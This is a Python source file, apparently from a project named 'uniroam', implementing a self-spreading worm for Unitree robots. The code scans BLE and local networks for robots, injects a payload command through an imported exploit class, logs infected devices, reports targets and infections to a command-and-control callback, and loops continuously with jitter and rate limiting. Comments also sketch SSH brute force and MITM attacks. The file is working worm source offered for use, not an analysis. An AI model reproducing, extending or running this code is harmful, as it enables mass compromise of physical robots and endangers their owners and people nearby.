#!/usr/bin/env python3
"""
Worm Propagation Engine
Handles BLE and WiFi-based robot-to-robot infection
"""

import asyncio
import json
import time
import random
import subprocess
import socket
from typing import List, Dict, Optional, Set
from datetime import datetime, timedelta
from pathlib import Path

from uniroam import config
from uniroam.exploit_lib import scan_for_robots, UnitreeExploit

# ============================================================================
# Infection Tracking
# ============================================================================

class InfectionTracker:
    """Track infection attempts to prevent loops and enable rate limiting"""
    
    def __init__(self):
        self.history_file = Path(config.INFECTION_HISTORY_PATH)
        self.blacklist_file = Path(config.INFECTION_BLACKLIST_PATH)
        self.infected: Set[str] = set()
        self.failed: Dict[str, int] = {}
        self.infection_times: List[datetime] = []
        self._load_history()
    
    def _load_history(self):
        """Load infection history from disk"""
        try:
            if self.history_file.exists():
                with open(self.history_file, 'r') as f:
                    data = json.load(f)
                    self.infected = set(data.get('infected', []))
                    self.failed = data.get('failed', {})
        except Exception:
            pass
    
    def _save_history(self):
        """Save infection history to disk"""
        try:
            self.history_file.parent.mkdir(parents=True, exist_ok=True)
            with open(self.history_file, 'w') as f:
                json.dump({
                    'infected': list(self.infected),
                    'failed': self.failed
                }, f)
        except Exception:
            pass
    
    def is_infected(self, device_address: str) -> bool:
        """Check if device already infected"""
        return device_address in self.infected
    
    def is_blacklisted(self, device_address: str, max_failures: int = 3) -> bool:
        """Check if device should be blacklisted due to failures"""
        return self.failed.get(device_address, 0) >= max_failures
    
    def should_rate_limit(self) -> bool:
        """Check if we should rate limit based on recent infections"""
        now = datetime.now()
        # Remove infections older than 1 hour
        self.infection_times = [t for t in self.infection_times if now - t < timedelta(hours=1)]
        
        return len(self.infection_times) >= config.PROPAGATION_RATE_LIMIT
    
    def mark_infected(self, device_address: str, serial_number: Optional[str] = None):
        """Mark device as successfully infected"""
        self.infected.add(device_address)
        self.infection_times.append(datetime.now())
        if device_address in self.failed:
            del self.failed[device_address]
        self._save_history()
    
    def mark_failed(self, device_address: str):
        """Mark infection attempt as failed"""
        self.failed[device_address] = self.failed.get(device_address, 0) + 1
        self._save_history()

# ============================================================================
# Network Scanner
# ============================================================================

class NetworkScanner:
    """Scan local network for robots"""
    
    @staticmethod
    def get_local_ip() -> Optional[str]:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return None
    
    @staticmethod
    def get_network_range() -> Optional[str]:
        """Get network range (e.g., 192.168.1.0/24)"""
        ip = NetworkScanner.get_local_ip()
        if not ip:
            return None
        
        # Simple /24 network calculation
        parts = ip.split('.')
        network = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
        return network
    
    @staticmethod
    def scan_network_robots() -> List[Dict[str, str]]:
        """
        Scan local network for Unitree robots
        
        Returns:
            List of dicts with 'ip' and 'hostname' keys
        """
        robots = []
        network = NetworkScanner.get_network_range()
        
        if not network:
            return robots
        
        try:
            # Use nmap for network scanning (if available)
            result = subprocess.run(
                ['nmap', '-sn', '-T4', network],
                capture_output=True,
                text=True,
                timeout=config.NETWORK_SCAN_TIMEOUT
            )
            
            # Parse nmap output for Unitree robots
            lines = result.stdout.split('\n')
            current_ip = None
            
            for line in lines:
                if 'Nmap scan report for' in line:
                    parts = line.split()
                    current_ip = parts[-1].strip('()')
                elif 'MAC Address' in line and current_ip:
                    # Check if hostname contains Unitree identifiers
                    if any(model in line for model in config.SUPPORTED_MODELS):
                        robots.append({'ip': current_ip, 'hostname': line.split('(')[-1].strip(')')})
                        current_ip = None
        
        except (FileNotFoundError, subprocess.TimeoutExpired):
            # Fallback to simple ping sweep if nmap not available
            network_prefix = network.split('/')[0].rsplit('.', 1)[0]
            
            for i in range(1, 255):
                ip = f"{network_prefix}.{i}"
                try:
                    # Quick ping check
                    result = subprocess.run(
                        ['ping', '-c', '1', '-W', '1', ip],
                        capture_output=True,
                        timeout=2
                    )
                    
                    if result.returncode == 0:
                        # Try to get hostname
                        try:
                            hostname = socket.gethostbyaddr(ip)[0]
                            if any(model in hostname for model in config.SUPPORTED_MODELS):
                                robots.append({'ip': ip, 'hostname': hostname})
                        except:
                            pass
                
                except subprocess.TimeoutExpired:
                    continue
        
        return robots
    
    @staticmethod
    def scan_open_ports(ip: str, ports: List[int] = None) -> List[int]:
        """
        Scan for open ports on target
        
        Args:
            ip: Target IP address
            ports: List of ports to scan
        
        Returns:
            List of open ports
        """
        if ports is None:
            ports = config.NETWORK_PORT_SCAN_RANGE
        
        open_ports = []
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                continue
        
        return open_ports

# ============================================================================
# Worm Propagator
# ============================================================================

class WormPropagator:
    """Main propagation engine for worm spreading"""
    
    def __init__(self, c2_callback=None):
        """
        Initialize propagator
        
        Args:
            c2_callback: Optional callback function for reporting to C2
        """
        self.tracker = InfectionTracker()
        self.c2_callback = c2_callback
        self.propagation_enabled = config.PROPAGATION_ENABLED
        self.active_infections = 0
        self.total_infected = 0
        self.scan_count = 0
    
    async def scan_ble_targets(self, timeout: float = 30.0) -> List:
        """
        Scan for nearby robots via BLE
        
        Args:
            timeout: Scan duration
        
        Returns:
            List of uninfected robot devices
        """
        self.scan_count += 1
        
        try:
            all_robots = await scan_for_robots(timeout=timeout)
            
            # Filter out already infected or blacklisted robots
            targets = []
            for robot in all_robots:
                if not self.tracker.is_infected(robot.address):
                    if not self.tracker.is_blacklisted(robot.address):
                        targets.append(robot)
            
            return targets
        
        except Exception as e:
            return []
    
    def scan_network_targets(self) -> List[Dict]:
        """
        Scan local network for robots
        
        Returns:
            List of potential network targets
        """
        try:
            robots = NetworkScanner.scan_network_robots()
            return robots
        except Exception:
            return []
    
    async def infect_target(self, device, payload_cmd: str) -> bool:
        """
        Infect a single target robot
        
        Args:
            device: BLE device object or IP address
            payload_cmd: Command to inject
        
        Returns:
            True if infection successful
        """
        # Check rate limiting
        if self.tracker.should_rate_limit():
            await asyncio.sleep(random.randint(60, 180))  # Wait before continuing
        
        try:
            self.active_infections += 1
            
            # Perform infection
            exploit = UnitreeExploit(device)
            success = await exploit.execute_command(payload_cmd)
            
            if success:
                self.tracker.mark_infected(device.address, exploit.serial_number)
                self.total_infected += 1
                
                # Report to C2
                if self.c2_callback:
                    await self.c2_callback({
                        'event': 'infection_success',
                        'target': device.address,
                        'serial': exploit.serial_number,
                        'timestamp': datetime.now().isoformat()
                    })
                
                return True
            else:
                self.tracker.mark_failed(device.address)
                return False
        
        except Exception as e:
            self.tracker.mark_failed(device.address)
            return False
        
        finally:
            self.active_infections -= 1
    
    async def propagate_ble(self, payload_cmd: str):
        """
        Continuous BLE propagation loop
        
        Args:
            payload_cmd: Command to inject on targets
        """
        while self.propagation_enabled:
            try:
                # Scan for targets
                targets = await self.scan_ble_targets(timeout=30.0)
                
                if targets:
                    # Report available targets to C2
                    if self.c2_callback:
                        await self.c2_callback({
                            'event': 'targets_found',
                            'count': len(targets),
                            'targets': [{'name': t.name, 'address': t.address} for t in targets]
                        })
                    
                    # Infect targets (respect concurrent infection limit)
                    tasks = []
                    for target in targets[:config.PROPAGATION_MAX_CONCURRENT]:
                        if self.active_infections < config.PROPAGATION_MAX_CONCURRENT:
                            task = asyncio.create_task(self.infect_target(target, payload_cmd))
                            tasks.append(task)
                    
                    if tasks:
                        await asyncio.gather(*tasks, return_exceptions=True)
                
                # Wait before next scan (with jitter)
                jitter = random.randint(-30, 30)
                await asyncio.sleep(config.PROPAGATION_BLE_INTERVAL + jitter)
            
            except Exception as e:
                # Continue propagation even on errors
                await asyncio.sleep(60)
    
    async def propagate_network(self, payload_cmd: str):
        """
        Network-based propagation loop
        
        Args:
            payload_cmd: Command to inject on targets
        """
        while self.propagation_enabled:
            try:
                # Scan network for robots
                network_robots = self.scan_network_targets()
                
                if network_robots and self.c2_callback:
                    await self.c2_callback({
                        'event': 'network_targets_found',
                        'count': len(network_robots),
                        'targets': network_robots
                    })
                
                # Network-based infection would go here
                # This could include:
                # - SSH brute force if SSH is open
                # - Exploiting other network services
                # - MITM attacks on robot traffic
                
                # For now, we focus on BLE propagation
                
                # Wait before next scan
                jitter = random.randint(-60, 60)
                await asyncio.sleep(config.PROPAGATION_WIFI_INTERVAL + jitter)
            
            except Exception:
                await asyncio.sleep(120)
    
    def stop_propagation(self):
        """Stop all propagation activities"""
        self.propagation_enabled = False
    
    def get_statistics(self) -> Dict:
        """
        Get propagation statistics
        
        Returns:
            Dict with propagation metrics
        """
        return {
            'total_infected': self.total_infected,
            'active_infections': self.active_infections,
            'scan_count': self.scan_count,
            'known_infected': len(self.tracker.infected),
            'blacklisted': len(self.tracker.failed),
            'propagation_enabled': self.propagation_enabled
        }

# ============================================================================
# Helper Functions
# ============================================================================

async def start_autonomous_propagation(payload_cmd: str, c2_callback=None):
    """
    Start autonomous worm propagation
    
    Args:
        payload_cmd: Command to inject
        c2_callback: Optional C2 callback function
    """
    propagator = WormPropagator(c2_callback=c2_callback)
    
    # Start both BLE and network propagation
    ble_task = asyncio.create_task(propagator.propagate_ble(payload_cmd))
    network_task = asyncio.create_task(propagator.propagate_network(payload_cmd))
    
    await asyncio.gather(ble_task, network_task)
    
    return propagator

